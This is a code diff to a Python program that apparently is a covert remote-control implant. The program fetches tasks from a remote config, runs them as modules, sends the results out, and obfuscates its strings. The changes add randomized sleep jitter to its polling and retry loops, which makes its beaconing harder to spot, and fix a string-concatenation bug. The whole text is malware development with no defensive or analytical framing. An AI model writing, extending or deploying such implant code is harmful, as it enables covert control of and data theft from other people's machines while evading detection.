@@ -10,6 +10,7 @@ import zipfile
 import StringIO
 import Queue
 import xxhash
+import random
 from uuid import getnode as get_mac
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -41,6 +42,7 @@ class Config:
 		self.tasks = Queue.Queue() #task queue
 		self.u_id() #generate a new id on start
 		self.u_pk(self.pk) #import public key into cipher object
+		random.seed()
 
 	#generates a new id by hashing time and seed
 	def u_id(self):
@@ -156,6 +158,9 @@ class Config:
 	def u_fn_s(self, new):
 		self.fn_s = self.obfstr(new)
 		return
+
+	def g_sleep(self):
+		return random.randint(self.sleep, self.sleep + self.sleep)
 
 	#deobfuscates strings
 	def fixstr(self, o_str):
@@ -291,11 +296,11 @@ def run_module(**task):
 			if result is not None:
 				push_data(result)
 			else:
-				s = time.time() + ":" + task[config.g_fn_s()]
+				s = str(time.time()) + ":" + str(task[config.g_fn_s()])
 				push_data(s)
 			return
 		except:
-			time.sleep(config.sleep)
+			time.sleep(config.g_sleep())
 
 #runs all queued modules in new threads
 def module_runner():
@@ -318,12 +323,12 @@ while True: #keep trying to create config file until successful
 		create_config() #create a blank config file to register
 		break
 	except:
-		time.sleep(config.sleep)
+		time.sleep(config.g_sleep())
 while True: #keep checking for and running new tasks
 	if config.tasks.empty(): #get config file when all tasks have been finished
 		config_file = get_config()
 		if config_file == None:
-			time.sleep(config.sleep) #sleep if there are no new tasks
+			time.sleep(config.g_sleep()) #sleep if there are no new tasks
 			continue
 		for task in config_file:
 			config.tasks.put(task) #if there are tasks add them to the queue
@@ -334,4 +339,4 @@ while True: #keep checking for and running new tasks
 				clear_config()
 				break
 			except:
-				time.sleep(config.sleep)
+				time.sleep(config.g_sleep())
